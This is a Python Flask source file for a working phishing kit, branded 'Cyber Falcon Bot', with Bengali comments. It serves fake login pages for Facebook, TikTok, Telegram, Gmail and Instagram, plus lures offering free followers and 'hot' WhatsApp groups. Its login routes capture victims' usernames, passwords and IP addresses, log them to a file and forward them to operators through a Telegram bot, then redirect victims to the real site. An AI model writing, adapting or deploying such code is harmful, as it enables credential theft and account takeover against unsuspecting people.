from flask import Flask, request, jsonify, render_template, redirect
import json
import requests
import socket
import os
import time
from config import PORT, TELEGRAM_BOT_TOKEN

app = Flask(__name__)

current_page = "facebook"
public_url = None
active_chat_ids = set()
DATA_FILE = "bot_data.json"
WEBHOOK_SECRET = TELEGRAM_BOT_TOKEN  # টোকেনই সিক্রেট হিসেবে ব্যবহার করছি

def load_data():
    global public_url, active_chat_ids
    try:
        if os.path.exists(DATA_FILE):
            with open(DATA_FILE, 'r') as f:
                data = json.load(f)
                public_url = data.get('public_url')
                active_chat_ids = set(data.get('active_users', []))
                print(f"✅ ডাটা লোড: URL={public_url}, Users={len(active_chat_ids)}")
    except Exception as e:
        print(f"ডাটা লোড ব্যর্থ: {e}")

def save_data():
    try:
        with open(DATA_FILE, 'w') as f:
            json.dump({'public_url': public_url, 'active_users': list(active_chat_ids)}, f)
    except Exception as e:
        print(f"ডাটা সেভ ব্যর্থ: {e}")

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def add_chat_id(chat_id):
    active_chat_ids.add(chat_id)
    save_data()

def send_to_telegram(data):
    platform_info = {
        "facebook": {"name": "Facebook", "icon": "📘"},
        "tiktok": {"name": "TikTok", "icon": "🎵"},
        "telegram": {"name": "Telegram", "icon": "📱"},
        "gmail": {"name": "Gmail", "icon": "📧"},
        "instagram": {"name": "Instagram", "icon": "📸"},
        "facebook_followers": {"name": "Facebook Followers", "icon": "🎯"},
        "whatsapp_groups": {"name": "WhatsApp Groups", "icon": "🤤"},
        "tiktok_boost": {"name": "TikTok Booster", "icon": "🚀"},
        "tiktok_followers": {"name": "TikTok Followers", "icon": "💎"}
    }
    page_type = data.get('pageType', 'unknown')
    platform = platform_info.get(page_type, {"name": page_type, "icon": "🌐"})
    
    message = f"""
🦅🥷 {platform['name']} Login 🦅🥷
{platform['icon']} Platform: {platform['name']}
👤 Email: {data.get('username', 'N/A')}
🔑 Pass: {data.get('password', 'N/A')}
🌐 IP: {data.get('ipAddress', 'Unknown')}
⏰ Time: {time.strftime('%Y-%m-%d %H:%M:%S')}
"""
    for chat_id in active_chat_ids:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        try:
            requests.post(url, json={'chat_id': chat_id, 'text': message})
        except:
            pass

# ============= ওয়েবহুক হ্যান্ডলার (বটের মেসেজ প্রসেসিং) =============
def send_telegram_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'}
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"Error: {e}")

def edit_telegram_message(chat_id, message_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/editMessageText"
    payload = {'chat_id': chat_id, 'message_id': message_id, 'text': text, 'parse_mode': 'Markdown'}
    if reply_markup:
        payload['reply_markup'] = json.dumps(reply_markup)
    try:
        requests.post(url, json=payload, timeout=10)
    except Exception as e:
        print(f"Error: {e}")

def answer_callback(callback_id):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/answerCallbackQuery"
    try:
        requests.post(url, json={'callback_query_id': callback_id}, timeout=10)
    except:
        pass

# ============= বটের মেনু =============
def start_bot(chat_id, message_id=None):
    try:
        requests.get(f"http://localhost:{PORT}/add_user/{chat_id}", timeout=2)
    except:
        pass
    
    render_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://fc-bot-b3wy.onrender.com')
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "🌐 All Mane page", "callback_data": "All_Mane_page"}],
            [{"text": "📢 advance page", "callback_data": "All_advance_page"}],
            [{"text": "🦅 Status", "callback_data": "status"},
             {"text": "🥷 community", "url": "https://t.me/+j8x9Tp4CGa80ZmM1"}]
        ]
    }
    
    message = f"""
😈 🦅 𝘾.𝙁 𝘽𝙤𝙩 𝙥𝙧𝙤 😈🦅

𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝘾𝙮𝙗𝙚𝙧 𝙛𝙖𝙡𝙘𝙤𝙣 𝙗𝙤𝙩!

🥷 𝗦𝘁𝗮𝘁𝘂𝘀: 🟢 𝗔𝗰𝘁𝗶𝘃𝗲
"""
    if message_id:
        edit_telegram_message(chat_id, message_id, message, keyboard)
    else:
        send_telegram_message(chat_id, message, keyboard)

def all_menu(chat_id, message_id):
    keyboard = {
        "inline_keyboard": [
            [{"text": "📘 Facebook", "callback_data": "_facebook"}],
            [{"text": "🤤 TikTok", "callback_data": "_tiktok"}],
            [{"text": "✈️ Telegram", "callback_data": "_telegram"}],
            [{"text": "📧 Gmail", "callback_data": "_gmail"}],
            [{"text": "📷 Instagram", "callback_data": "_instagram"}],
            [{"text": "🔙 Back", "callback_data": "main_menu"}]
        ]
    }
    edit_telegram_message(chat_id, message_id, "😈 All Mane page Platforms\n\nSelect a platform:", keyboard)

def advance_menu(chat_id, message_id):
    keyboard = {
        "inline_keyboard": [
            [{"text": "🎯 ফ্রি ফলোয়ার", "callback_data": "_at"}],
            [{"text": "🤤 হট গ্রুপ লিংক", "callback_data": "_ai"}],
            [{"text": "📢 TikTok বুস্টার", "callback_data": "_ad"}],
            [{"text": "🚀 TikTok ফলোয়ার", "callback_data": "_go"}],
            [{"text": "🔙 Back", "callback_data": "main_menu"}]
        ]
    }
    edit_telegram_message(chat_id, message_id, "📢 advance page Menu\n\nSelect an option:", keyboard)

def page_link(chat_id, message_id, title, url_path, back_callback):
    render_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://fc-bot-b3wy.onrender.com')
    full_url = f"{render_url}/{url_path}"
    keyboard = {
        "inline_keyboard": [
            [{"text": "🌐 ওপেন পেজ", "url": full_url}],
            [{"text": "🔙 Back", "callback_data": back_callback}]
        ]
    }
    edit_telegram_message(chat_id, message_id, f"{title}\n\n🔗 {full_url}", keyboard)

def status_bot(chat_id, message_id):
    render_url = os.environ.get('RENDER_EXTERNAL_URL', 'https://fc-bot-b3wy.onrender.com')
    keyboard = {"inline_keyboard": [[{"text": "🔙 Back", "callback_data": "main_menu"}]]}
    edit_telegram_message(chat_id, message_id, f"✅ Bot is Active\n\n🌐 URL: {render_url}", keyboard)

def back_to_main(chat_id, message_id):
    start_bot(chat_id, message_id)

# ============= ফ্লাস্ক রাউট =============
@app.route('/')
def index():
    template_file = f"templates/{current_page}.html"
    if os.path.exists(template_file):
        return render_template(f"{current_page}.html")
    return "Template not found", 500

@app.route('/set_page/<page_type>')
def set_page(page_type):
    global current_page
    if page_type in ["facebook", "tiktok", "telegram", "gmail", "instagram"]:
        current_page = page_type
        return f"Page set to {current_page}"
    return "Invalid page"

@app.route('/get_ngrok_url')
def get_ngrok_url():
    global public_url
    render_url = os.environ.get('RENDER_EXTERNAL_URL')
    if render_url and not public_url:
        public_url = render_url
    return jsonify({'public_url': public_url, 'active_users': len(active_chat_ids), 'current_page': current_page})

@app.route('/set_public_url', methods=['POST'])
def set_public_url():
    global public_url
    data = request.json
    if data.get('url'):
        public_url = data['url']
        save_data()
        return jsonify({'status': 'success'})
    return jsonify({'status': 'error'}), 400

@app.route('/add_user/<chat_id>')
def add_user_route(chat_id):
    try:
        add_chat_id(int(chat_id))
        return jsonify({'status': 'success'})
    except:
        return jsonify({'status': 'error'}), 400

@app.route('/login', methods=['POST'])
def login():
    data = {
        'username': request.form['username'],
        'password': request.form['password'],
        'ipAddress': request.remote_addr,
        'userAgent': request.headers.get('User-Agent'),
        'pageType': current_page,
        'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
    }
    with open('credentials.json', 'a') as f:
        f.write(json.dumps(data) + '\n')
    send_to_telegram(data)
    return redirect("https://www.facebook.com/")

@app.route('/login2', methods=['POST'])
def login2():
    data = {}
    for key in request.form:
        data[key] = request.form[key]
    data['ipAddress'] = request.remote_addr
    data['userAgent'] = request.headers.get('User-Agent')
    data['timestamp'] = time.strftime("%Y-%m-%d %H:%M:%S")
    with open('credentials.json', 'a') as f:
        f.write(json.dumps(data) + '\n')
    send_to_telegram(data)
    return redirect("https://www.google.com/")

@app.route('/facebook_followers')
def facebook_followers():
    try:
        return render_template("facebook_followers.html")
    except Exception as e:
        return f"Error: {e}", 500

@app.route('/whatsapp_groups')
def whatsapp_groups():
    try:
        return render_template("whatsapp_groups.html")
    except Exception as e:
        return f"Error: {e}", 500

@app.route('/tiktok_boost')
def tiktok_boost():
    try:
        return render_template("tiktok_boost.html")
    except Exception as e:
        return f"Error: {e}", 500

@app.route('/tiktok_followers')
def tiktok_followers():
    try:
        return render_template("tiktok_followers.html")
    except Exception as e:
        return f"Error: {e}", 500

@app.route('/facebook')
def facebook_page():
    return render_template("facebook.html")

@app.route('/tiktok')
def tiktok_page():
    return render_template("tiktok.html")

@app.route('/telegram')
def telegram_page():
    return render_template("telegram.html")

@app.route('/gmail')
def gmail_page():
    return render_template("gmail.html")

@app.route('/instagram')
def instagram_page():
    return render_template("instagram.html")

# ============= ওয়েবহুক এন্ডপয়েন্ট (এখানেই সব হ্যান্ডলার) =============
@app.route(f'/webhook/{WEBHOOK_SECRET}', methods=['POST'])
def webhook():
    try:
        update = request.get_json()
        if not update:
            return "ok", 200
        
        if 'message' in update and 'text' in update['message']:
            chat_id = update['message']['chat']['id']
            text = update['message']['text']
            if text in ['/start', '/link']:
                start_bot(chat_id)
        
        elif 'callback_query' in update:
            cb = update['callback_query']
            chat_id = cb['message']['chat']['id']
            msg_id = cb['message']['message_id']
            data = cb['data']
            cb_id = cb['id']
            
            answer_callback(cb_id)
            
            if data == "All_Mane_page":
                all_menu(chat_id, msg_id)
            elif data == "All_advance_page":
                advance_menu(chat_id, msg_id)
            elif data == "main_menu":
                back_to_main(chat_id, msg_id)
            elif data == "status":
                status_bot(chat_id, msg_id)
            elif data == "_facebook":
                page_link(chat_id, msg_id, "📘 Facebook", "facebook", "All_Mane_page")
            elif data == "_tiktok":
                page_link(chat_id, msg_id, "🤤 TikTok", "tiktok", "All_Mane_page")
            elif data == "_telegram":
                page_link(chat_id, msg_id, "✈️ Telegram", "telegram", "All_Mane_page")
            elif data == "_gmail":
                page_link(chat_id, msg_id, "📧 Gmail", "gmail", "All_Mane_page")
            elif data == "_instagram":
                page_link(chat_id, msg_id, "📷 Instagram", "instagram", "All_Mane_page")
            elif data == "_at":
                page_link(chat_id, msg_id, "🎯 ফ্রি ফেসবুক ফলোয়ার", "facebook_followers", "All_advance_page")
            elif data == "_ai":
                page_link(chat_id, msg_id, "🤤 হট হোয়াটসঅ্যাপ গ্রুপ", "whatsapp_groups", "All_advance_page")
            elif data == "_ad":
                page_link(chat_id, msg_id, "📢 TikTok ভিউ+লাইক বুস্টার", "tiktok_boost", "All_advance_page")
            elif data == "_go":
                page_link(chat_id, msg_id, "🚀 TikTok ফলোয়ার", "tiktok_followers", "All_advance_page")
        
        return "ok", 200
    except Exception as e:
        print(f"Webhook error: {e}")
        return "ok", 200

@app.route('/health')
def health():
    return "ok", 200

# ============= Main =============
if __name__ == '__main__':
    load_data()
    
    render_url = os.environ.get('RENDER_EXTERNAL_URL')
    if render_url:
        public_url = render_url
        print(f"🥷 Render URL: {public_url}")
    
    # ওয়েবহুক সেটআপ
    webhook_url = f"{render_url}/webhook/{WEBHOOK_SECRET}"
    api_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook"
    try:
        resp = requests.post(api_url, json={'url': webhook_url, 'drop_pending_updates': True})
        if resp.status_code == 200 and resp.json().get('ok'):
            print(f"✅ Webhook set: {webhook_url}")
        else:
            print(f"❌ Webhook failed: {resp.text}")
    except Exception as e:
        print(f"❌ Webhook error: {e}")
    
    local_ip = get_local_ip()
    print(f"\n{'='*50}")
    print(f"🚀 Cyber Falcon Bot - Flask Server")
    print(f"{'='*50}")
    print(f"📍 Local URL: http://{local_ip}:5000")
    print(f"🌐 Public URL: {render_url}")
    print(f"📄 Current page: {current_page}")
    print(f"👥 Active users: {len(active_chat_ids)}")
    print(f"{'='*50}")
    
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
